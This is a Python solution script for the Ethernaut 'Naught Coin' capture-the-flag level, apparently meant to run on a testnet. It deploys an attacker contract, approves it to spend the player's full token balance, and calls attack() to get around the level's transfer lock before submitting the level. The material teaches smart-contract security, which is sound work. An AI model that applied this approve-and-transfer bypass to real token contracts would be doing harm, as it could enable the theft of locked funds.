from ape import accounts, project
from .utils.helper import get_level_instance, level_completed

ETHERNAUT = "0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6"
LEVEL = "0xb5858B8EDE0030e46C0Ac1aaAedea8Fb71EF423C"


def main():
    # setting up user
    user = accounts.load("YOUR_ALIAS")
    user.set_autosign(enabled=True)  # make sure you are on testnet

    # get level instance
    instance, ethernaut = get_level_instance(ETHERNAUT, LEVEL, user)

    # deploy hacker contract
    print("\n--- Deploying hacker contract ---\n")
    hacker = project.NaughtCoin.deploy(instance, sender=user)

    # setting up level instance and naught coin contract
    print("\n--- Setting up instance contract ---\n")
    naught_coin = project.ERC20.at(instance)

    # exploit goes here
    # note that you can approve yourself, but in this case I chose to approve my hacker contract
    print(
        f"\n-- Our balance before the exploit: {naught_coin.balanceOf(user.address)} ---\n"
    )
    print(
        f"\n--- Balance of our hacker contract: {naught_coin.balanceOf(hacker.address)} ---\n"
    )
    print("\n--- Exploiting level instance ---\n")
    naught_coin.approve(
        hacker.address, naught_coin.balanceOf(user.address), sender=user
    )
    hacker.attack(sender=user)
    print(
        f"\n-- Our balance after the exploit: {naught_coin.balanceOf(user.address)} ---\n"
    )
    print(
        f"\n--- Balance of our hacker contract: {naught_coin.balanceOf(hacker.address)} ---\n"
    )

    # submiting level instance
    print("\n--- Submitting level instance ---\n")
    submit_tx = ethernaut.submitLevelInstance(instance, sender=user)

    # checking if level is completed
    level_completed(ethernaut, submit_tx, user.address, instance, LEVEL)

    print("\n--- 🥂!LEVEL COMPLETED!🥂 ---\n")


if __name__ == "__main__":
    main()
